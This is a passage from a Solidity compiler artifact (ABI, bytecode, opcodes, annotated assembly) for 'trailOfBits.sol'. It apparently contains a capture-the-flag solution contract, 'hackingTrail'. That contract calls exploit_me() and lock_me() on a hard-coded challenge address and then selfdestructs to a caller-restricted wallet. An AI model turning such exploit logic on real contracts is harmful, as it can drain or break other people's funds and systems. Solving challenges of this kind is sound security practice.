																	"nodeType": "YulIdentifier",
																	"src": "356:37:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "356:65:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "356:65:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "282:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "294:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "305:4:1",
														"type": ""
													}
												],
												"src": "218:210:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "6080604052348015600f57600080fd5b506004361060285760003560e01c8063919840ad14602d575b600080fd5b60336047565b604051603e91906085565b60405180910390f35b60008073ae036c65c649172b43ef7156b009c6221b596b8b3b90506000811191505090565b60008115159050919050565b607f81606c565b82525050565b6000602082019050609860008301846078565b9291505056fea264697066735822122026ff7e27a46e17c57534d6622163bbce03224ba582aad476e5f4cb980457356264736f6c634300080a0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH1 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH1 0x28 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x919840AD EQ PUSH1 0x2D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x33 PUSH1 0x47 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x3E SWAP2 SWAP1 PUSH1 0x85 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH20 0xAE036C65C649172B43EF7156B009C6221B596B8B EXTCODESIZE SWAP1 POP PUSH1 0x0 DUP2 GT SWAP2 POP POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x7F DUP2 PUSH1 0x6C JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH1 0x98 PUSH1 0x0 DUP4 ADD DUP5 PUSH1 0x78 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0x26 SELFDESTRUCT PUSH31 0x27A46E17C57534D6622163BBCE03224BA582AAD476E5F4CB98045735626473 PUSH16 0x6C634300080A00330000000000000000 ",
							"sourceMap": "574:230:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;600:201;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;633:4;650:9;714:42;702:55;694:63;;792:1;785:4;:8;778:15;;;600:201;:::o;7:90:1:-;41:7;84:5;77:13;70:21;59:32;;7:90;;;:::o;103:109::-;184:21;199:5;184:21;:::i;:::-;179:3;172:34;103:109;;:::o;218:210::-;305:4;343:2;332:9;328:18;320:26;;356:65;418:1;407:9;403:17;394:6;356:65;:::i;:::-;218:210;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "42400",
								"executionCost": "93",
								"totalCost": "42493"
							},
							"external": {
								"check()": "2940"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 574,
									"end": 804,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 574,
									"end": 804,
									"name": "RETURN",
									"source": 0
								}
							],
							".data": {
								"0": {
									".auxdata": "a264697066735822122026ff7e27a46e17c57534d6622163bbce03224ba582aad476e5f4cb980457356264736f6c634300080a0033",
									".code": [
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "CALLVALUE",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "ISZERO",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "919840AD"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 574,
											"end": 804,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 574,
											"end": 804,
											"name": "REVERT",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "tag",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "tag",
											"source": 0,
											"value": "6"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "MLOAD",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "RETURN",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 633,
											"end": 637,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 650,
											"end": 659,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 714,
											"end": 756,
											"name": "PUSH",
											"source": 0,
											"value": "AE036C65C649172B43EF7156B009C6221B596B8B"
										},
										{
											"begin": 702,
											"end": 757,
											"name": "EXTCODESIZE",
											"source": 0
										},
										{
											"begin": 694,
											"end": 757,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 694,
											"end": 757,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 792,
											"end": 793,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 785,
											"end": 789,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 785,
											"end": 793,
											"name": "GT",
											"source": 0
										},
										{
											"begin": 778,
											"end": 793,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 778,
											"end": 793,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 778,
											"end": 793,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 600,
											"end": 801,
											"name": "JUMP",
											"source": 0,
											"value": "[out]"
										},
										{
											"begin": 7,
											"end": 97,
											"name": "tag",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 7,
											"end": 97,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 41,
											"end": 48,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 84,
											"end": 89,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 77,
											"end": 90,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 70,
											"end": 91,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 59,
											"end": 91,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 59,
											"end": 91,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 97,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 7,
											"end": 97,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 7,
											"end": 97,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 7,
											"end": 97,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 103,
											"end": 212,
											"name": "tag",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 103,
											"end": 212,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 184,
											"end": 205,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 199,
											"end": 204,
											"name": "DUP2",
											"source": 1
										},
										{
											"begin": 184,
											"end": 205,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "9"
										},
										{
											"begin": 184,
											"end": 205,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 184,
											"end": 205,
											"name": "tag",
											"source": 1,
											"value": "14"
										},
										{
											"begin": 184,
											"end": 205,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 179,
											"end": 182,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 172,
											"end": 206,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 103,
											"end": 212,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 103,
											"end": 212,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 103,
											"end": 212,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										},
										{
											"begin": 218,
											"end": 428,
											"name": "tag",
											"source": 1,
											"value": "7"
										},
										{
											"begin": 218,
											"end": 428,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 305,
											"end": 309,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 343,
											"end": 345,
											"name": "PUSH",
											"source": 1,
											"value": "20"
										},
										{
											"begin": 332,
											"end": 341,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 328,
											"end": 346,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 320,
											"end": 346,
											"name": "SWAP1",
											"source": 1
										},
										{
											"begin": 320,
											"end": 346,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 356,
											"end": 421,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 418,
											"end": 419,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 407,
											"end": 416,
											"name": "DUP4",
											"source": 1
										},
										{
											"begin": 403,
											"end": 420,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 394,
											"end": 400,
											"name": "DUP5",
											"source": 1
										},
										{
											"begin": 356,
											"end": 421,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "10"
										},
										{
											"begin": 356,
											"end": 421,
											"name": "JUMP",
											"source": 1,
											"value": "[in]"
										},
										{
											"begin": 356,
											"end": 421,
											"name": "tag",
											"source": 1,
											"value": "16"
										},
										{
											"begin": 356,
											"end": 421,
											"name": "JUMPDEST",
											"source": 1
										},
										{
											"begin": 218,
											"end": 428,
											"name": "SWAP3",
											"source": 1
										},
										{
											"begin": 218,
											"end": 428,
											"name": "SWAP2",
											"source": 1
										},
										{
											"begin": 218,
											"end": 428,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 218,
											"end": 428,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 218,
											"end": 428,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"check()": "919840ad"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.10+commit.fc410830\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"check\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"trailOfBits.sol\":\"checker\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"trailOfBits.sol\":{\"keccak256\":\"0xb3f79e0569a3997dd41d576251423a91bf0645cbffc4178ef7b0a3f444095423\",\"urls\":[\"bzz-raw://65cb25c28cf66246e80cfe2ab6cfb2e72cf43aa4493b48768c8349c227fc2243\",\"dweb:/ipfs/QmQ97WoVEeqYghJjXRs3naJGdoStgWsvZQGq7hgQ65BPyE\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				},
				"hackingTrail": {
					"abi": [
						{
							"inputs": [],
							"name": "hackTrail",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"stateMutability": "payable",
							"type": "receive"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"trailOfBits.sol\":808:1509  contract hackingTrail {... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"trailOfBits.sol\":808:1509  contract hackingTrail {... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x157bca60\n      eq\n      tag_3\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n        /* \"trailOfBits.sol\":1410:1422  bool success */\n      0x00\n        /* \"trailOfBits.sol\":880:922  0xcD6a42782d230D7c13A74ddec5dD140e55499Df9 */\n      0xcd6a42782d230d7c13a74ddec5dd140e55499df9\n        /* \"trailOfBits.sol\":1427:1454  address(challengeAddr).call */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trailOfBits.sol\":1473:1495  keccak256(\"lock_me()\") */\n      0x4c228cc7776ff09193dddeaa40b26ebd5d18d89e2b6e01adf9e9d8bfc40dcb16\n        /* \"trailOfBits.sol\":1455:1497  abi.encode(bytes4(keccak256(\"lock_me()\"))) */\n      add(0x20, mload(0x40))\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"trailOfBits.sol\":1427:1498  address(challengeAddr).call(abi.encode(bytes4(keccak256(\"lock_me()\")))) */\n      mload(0x40)\n      tag_8\n      swap2\n      swap1\n      tag_9\n      jump\t// in\n    tag_8:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup7\n      gas\n      call\n      swap2\n      pop\n      pop\n      returndatasize\n      dup1\n      0x00\n      dup2\n      eq\n      tag_12\n      jumpi\n      mload(0x40)\n      swap2\n      pop\n      and(add(returndatasize, 0x3f), not(0x1f))\n      dup3\n      add\n      0x40\n      mstore\n      returndatasize\n      dup3\n      mstore\n      returndatasize\n      0x00\n      0x20\n      dup5\n      add\n      returndatacopy\n      jump(tag_11)\n    tag_12:\n      0x60\n      swap2\n      pop\n    tag_11:\n      pop\n        /* \"trailOfBits.sol\":1409:1498  (bool success,) = address(challengeAddr).call(abi.encode(bytes4(keccak256(\"lock_me()\")))) */\n      pop\n      swap1\n      pop\n        /* \"trailOfBits.sol\":1398:1506  {... */\n      pop\n        /* \"trailOfBits.sol\":808:1509  contract hackingTrail {... */\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"trailOfBits.sol\":1097:1363  function hackTrail() external onlyRoki {... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      stop\n    tag_15:\n        /* \"trailOfBits.sol\":990:1032  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"trailOfBits.sol\":968:1033  msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"trailOfBits.sol\":968:978  msg.sender */\n      caller\n        /* \"trailOfBits.sol\":968:1033  msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      eq\n        /* \"trailOfBits.sol\":960:1069  require(msg.sender == address(0x798349E06c67272465123B91bd88C5d19b8c7878), \"lol how did you even find this?\") */\n      tag_17\n      jumpi\n      mload(0x40)\n      0x08c379a000000000000000000000000000000000000000000000000000000000\n      dup2\n      mstore\n      0x04\n      add\n      tag_18\n      swap1\n      tag_19\n      jump\t// in\n    tag_18:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_17:\n        /* \"trailOfBits.sol\":1147:1167  IChallenge challenge */\n      0x00\n        /* \"trailOfBits.sol\":880:922  0xcD6a42782d230D7c13A74ddec5dD140e55499Df9 */\n      0xcd6a42782d230d7c13a74ddec5dd140e55499df9\n        /* \"trailOfBits.sol\":1147:1195  IChallenge challenge = IChallenge(challengeAddr) */\n      swap1\n      pop\n        /* \"trailOfBits.sol\":1206:1215  challenge */\n      dup1\n        /* \"trailOfBits.sol\":1206:1226  challenge.exploit_me */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x548853a0\n        /* \"trailOfBits.sol\":1235:1277  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"trailOfBits.sol\":1206:1279  challenge.exploit_me(address(0x798349E06c67272465123B91bd88C5d19b8c7878)) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_21\n      swap2\n      swap1\n      tag_22\n      jump\t// in\n    tag_21:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_25\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_25:\n      pop\n      pop\n      pop\n      pop\n        /* \"trailOfBits.sol\":1311:1353  0x798349E06c67272465123B91bd88C5d19b8c7878 */\n      0x798349e06c67272465123b91bd88c5d19b8c7878\n        /* \"trailOfBits.sol\":1290:1355  selfdestruct(payable(0x798349E06c67272465123B91bd88C5d19b8c7878)) */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      selfdestruct\n        /* \"#utility.yul\":7:156   */\n    tag_26:\n        /* \"#utility.yul\":43:50   */\n      0x00\n        /* \"#utility.yul\":83:149   */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":76:81   */\n      dup3\n        /* \"#utility.yul\":72:150   */\n      and\n        /* \"#utility.yul\":61:150   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:156   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":162:277   */\n    tag_27:\n        /* \"#utility.yul\":247:270   */\n      tag_41\n        /* \"#utility.yul\":264:269   */\n      dup2\n        /* \"#utility.yul\":247:270   */\n      tag_26\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":242:245   */\n      dup3\n        /* \"#utility.yul\":235:271   */\n      mstore\n        /* \"#utility.yul\":162:277   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":283:501   */\n    tag_7:\n        /* \"#utility.yul\":374:378   */\n      0x00\n        /* \"#utility.yul\":412:414   */\n      0x20\n        /* \"#utility.yul\":401:410   */\n      dup3\n        /* \"#utility.yul\":397:415   */\n      add\n        /* \"#utility.yul\":389:415   */\n      swap1\n      pop\n        /* \"#utility.yul\":425:494   */\n      tag_43\n        /* \"#utility.yul\":491:492   */\n      0x00\n        /* \"#utility.yul\":480:489   */\n      dup4\n        /* \"#utility.yul\":476:493   */\n      add\n        /* \"#utility.yul\":467:473   */\n      dup5\n        /* \"#utility.yul\":425:494   */\n      tag_27\n      jump\t// in\n    tag_43:\n        /* \"#utility.yul\":283:501   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":507:605   */\n    tag_28:\n        /* \"#utility.yul\":558:564   */\n      0x00\n        /* \"#utility.yul\":592:597   */\n      dup2\n        /* \"#utility.yul\":586:598   */\n      mload\n        /* \"#utility.yul\":576:598   */\n      swap1\n      pop\n        /* \"#utility.yul\":507:605   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":611:758   */\n    tag_29:\n        /* \"#utility.yul\":712:723   */\n      0x00\n        /* \"#utility.yul\":749:752   */\n      dup2\n        /* \"#utility.yul\":734:752   */\n      swap1\n      pop\n        /* \"#utility.yul\":611:758   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":764:1071   */\n    tag_30:\n        /* \"#utility.yul\":832:833   */\n      0x00\n        /* \"#utility.yul\":842:955   */\n    tag_47:\n        /* \"#utility.yul\":856:862   */\n      dup4\n        /* \"#utility.yul\":853:854   */\n      dup2\n        /* \"#utility.yul\":850:863   */\n      lt\n        /* \"#utility.yul\":842:955   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":941:942   */\n      dup1\n        /* \"#utility.yul\":936:939   */\n      dup3\n        /* \"#utility.yul\":932:943   */\n      add\n        /* \"#utility.yul\":926:944   */\n      mload\n        /* \"#utility.yul\":922:923   */\n      dup2\n        /* \"#utility.yul\":917:920   */\n      dup5\n        /* \"#utility.yul\":913:924   */\n      add\n        /* \"#utility.yul\":906:945   */\n      mstore\n        /* \"#utility.yul\":878:880   */\n      0x20\n        /* \"#utility.yul\":875:876   */\n      dup2\n        /* \"#utility.yul\":871:881   */\n      add\n        /* \"#utility.yul\":866:881   */\n      swap1\n      pop\n        /* \"#utility.yul\":842:955   */\n      jump(tag_47)\n    tag_49:\n        /* \"#utility.yul\":973:979   */\n      dup4\n        /* \"#utility.yul\":970:971   */\n      dup2\n        /* \"#utility.yul\":967:980   */\n      gt\n        /* \"#utility.yul\":964:1065   */\n      iszero\n      tag_50\n      jumpi\n        /* \"#utility.yul\":1053:1054   */\n      0x00\n        /* \"#utility.yul\":1044:1050   */\n      dup5\n        /* \"#utility.yul\":1039:1042   */\n      dup5\n        /* \"#utility.yul\":1035:1051   */\n      add\n        /* \"#utility.yul\":1028:1055   */\n      mstore\n        /* \"#utility.yul\":964:1065   */\n    tag_50:\n        /* \"#utility.yul\":813:1071   */\n      pop\n        /* \"#utility.yul\":764:1071   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1077:1450   */\n    tag_31:\n        /* \"#utility.yul\":1181:1184   */\n      0x00\n        /* \"#utility.yul\":1209:1247   */\n      tag_52\n        /* \"#utility.yul\":1241:1246   */\n      dup3\n        /* \"#utility.yul\":1209:1247   */\n      tag_28\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1263:1351   */\n      tag_53\n        /* \"#utility.yul\":1344:1350   */\n      dup2\n        /* \"#utility.yul\":1339:1342   */\n      dup6\n        /* \"#utility.yul\":1263:1351   */\n      tag_29\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":1256:1351   */\n      swap4\n      pop\n        /* \"#utility.yul\":1360:1412   */\n      tag_54\n        /* \"#utility.yul\":1405:1411   */\n      dup2\n        /* \"#utility.yul\":1400:1403   */\n      dup6\n        /* \"#utility.yul\":1393:1397   */\n      0x20\n        /* \"#utility.yul\":1386:1391   */\n      dup7\n        /* \"#utility.yul\":1382:1398   */\n      